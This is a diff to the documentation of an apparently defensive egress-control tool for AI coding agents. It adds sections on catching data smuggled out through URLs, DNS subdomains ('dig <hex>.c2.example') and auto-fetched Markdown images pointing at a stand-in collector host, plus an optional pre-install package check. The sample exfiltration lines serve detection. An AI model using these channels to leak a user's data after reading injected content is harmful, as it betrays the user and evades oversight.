@@ -189,6 +189,56 @@ A program that ignores proxy settings is not seen by the proxy. `ingress run -- 
 command so that the proxy is its only way out. What all of this does and does not cover, what was measured,
 and every setting: [`docs/EGRESS.md`](../../docs/EGRESS.md).
 
+## Data leaving inside an address
+
+The `PreToolUse` egress gate above also reads every URL and host name in a tool call for data riding out
+inside it, once the session has read outside content:
+
+- a URL that carries text a tool brought back earlier (recognised by short fingerprints of five-word runs that
+  `PostToolUse` keeps for the session, never the text itself), encoded or not
+- a host name whose subdomain labels carry encoded data (`dig <hex>.c2.example`: the lookup is the delivery)
+- a call that sends data (a file, a credential, encoded data, earlier tool-result text) to a host the session
+  never fetched from and you never named; for an MCP tool that sends mail or messages, a recipient whose domain
+  only appeared in outside content
+
+Each of these is an "ask" with the reason, answered like any other question from the gate (your permission
+prompt, or `INGRESS_HOOK_APPROVER=macos-presence`). Nothing new to install.
+
+**The reply itself.** A chat window that renders Markdown fetches `![](https://collect.example/p.png?d=…)` by
+itself, so a reply can leak without any tool call. Claude Code's terminal does not fetch images, but the same
+transcript may be rendered elsewhere. `ingress outcheck --hook` reads a `Stop` event (the reply from
+`last_assistant_message`, or else the end of `transcript_path`) and, when the reply carries data out, asks the
+model to write it again without those addresses; a second refusal in a row is shown to you instead, so it cannot
+loop. Optional:
+
+```json
+"Stop": [{ "hooks": [{ "type": "command", "command": "ingress outcheck --hook", "timeout": 10 }] }]
+```
+
+Limit: a `Stop` hook runs after the reply has been shown in the terminal. It keeps the leak from being repeated
+and tells you; it cannot take back what was already displayed. An app that renders replies should call
+`outcheck()` (or `ingress outcheck --safe`) before rendering.
+
+## Package check before install (optional)
+
+`ingress pkgcheck --hook` reads a `Bash` command before it runs and looks up every package an install line names
+(`npm install`, `npm i`, `pnpm add`, `yarn add`, `bun add`, `pip install`, `python -m pip install`, `uv add`,
+`uv pip install`) on registry.npmjs.org or pypi.org:
+
+```json
+{
+  "matcher": "Bash",
+  "hooks": [{ "type": "command", "command": "ingress pkgcheck --hook", "timeout": 60 }]
+}
+```
+
+(add it to the `PreToolUse` array, beside the egress gate). A package that is not on the registry, or whose
+README is rated hostile, is refused; any other high finding (a lookalike of a popular name, a brand-new package
+with an install script, a version that does not exist) is put to you; review findings stay quiet. Commands that
+install nothing are not looked up, so ordinary commands cost no network request. If the registry cannot be
+reached the hook says nothing, and the install goes ahead as it would have. `--offline` in the command keeps the
+name check and contacts nothing.
+
 ## Limits
 
 - Hooks see what the harness shows them. A tool whose output shape this hook does not know (a new built-in
